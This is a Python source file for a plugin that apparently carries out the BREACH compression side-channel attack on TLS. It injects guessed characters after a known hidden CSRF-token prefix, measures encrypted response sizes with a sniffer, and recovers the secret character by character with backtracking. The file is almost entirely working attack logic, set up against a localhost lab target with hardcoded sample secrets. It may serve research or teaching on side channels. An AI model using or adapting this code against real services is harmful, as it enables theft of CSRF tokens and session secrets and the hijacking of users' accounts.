import threading
from operator import or_
from functools import reduce
import struct
import time
import logging

SECRET = '0372e249-7932-41ba-8dbb-6e79e991c8e7'
TOKEN = '7b38918f6fcd5b2f1245fece252034b1d61bbf67452952dd47c8ac296a3c1b72'
PREFIX = 'input type="hidden" name="csrftoken" value="'#[-15:]
# PORT = 8443
PORT = 2000
INTERFACE = 'lo'

log = logging.getLogger(__name__)

class BreachPlugin:
    use_sniffer = True

    def __init__(self, core, sniffer):
        self.core = core
        self.sniffer = sniffer

    def start(self):
        self.test()

    def test_char(self, c, base, minsize):
        log.debug('Testing %s', c)
        # self.total = 0
        # resp = requests.get('https://127.0.0.1:8443', params={
        #     'test': base + c
        #     }, cookies={
        #         'sessionid': SECRET
        #     }, verify=False)
        # resp = requests.get('https://127.0.0.1:2000', params={
        #     'affiliate': 
        #     }, cookies={
        #         'SESSION': SECRET
        #     }, verify=False)
        
        if not self.sniffer.closed_connections.empty():
            log.error('Closed connections not empty: %r', self.sniffer.closed_connections.get())
        self.core.send(placeholders={
            'DATA': self.core.prefix + base + c
        })

        conn = self.sniffer.closed_connections.get()
        log.debug('Got connection %r', conn)
        if conn.tls_recvd > minsize:
            color = 91
        elif conn.tls_recvd < minsize:
            color = 92
        else:
            color = 93
        print("Bytes for {}: \033[{}m{}\033[0m".format(c, color, conn.tls_recvd))
        return conn.tls_recvd

    def test(self):
        charset = self.core.charset

        # do test request
        # self.core.send(placeholders={
        #     'DATA': self.core.prefix
        # })

        base = ''
        while len(base) < len(self.core.target):
            best = (9999, None)
            all_results = { c: 99999 for c in charset }
            back = [('', 9999)]
            while len(back) > 0:
                b, _ = back.pop(0)
                results = { c: 99999 for c in charset }
                for c in charset:
                    size = self.test_char(b + c, base, best[0])
                    if size:
                        results[c] = size
                        all_results[b+c] = size
                        if best[0] > size or best[0] == size and len(best[1]) < len(b+c):
                            best = size, b+c
                minsize = min(best[0], min(results.values()))
                best_results = []
                for c, val in results.items():
                    if val == minsize:
                        best_results.append((b+c, minsize))
                if len(best_results) == 1 and len(back) == 0:
                    break
                else:
                    back += best_results
                    back.sort(key=lambda x: x[1])
                    self.print_backlog(minsize, back, base)
                    self.print_state(base)
            best_results = []
            for c, val in all_results.items():
                if val == best[0]:
                    best_results.append(c)
            print('Results:', best_results)
            base += best[1]
            self.print_state(base)

    def print_backlog(self, minsize, back, base):
        back = ', '.join(
            "('{}{}\033[0m', {})".format(
                '\033[96m' if self.core.target.startswith(base + val) else '\033[91m',
                val,
                score)
            for val, score in back
        )
        print('Retesting with \033[94m{}\033[0m: [{}]'.format(minsize, back))

    def print_state(self, base):
        correct = ''
        for guess, ref in zip(base, self.core.target):
            if guess == ref:
                correct += guess
            else:
                break
        print("Current: \033[92m{}\033[91m{}\033[0m Target: \033[93m{}\033[0m".format(correct, base[len(correct):], self.core.target))

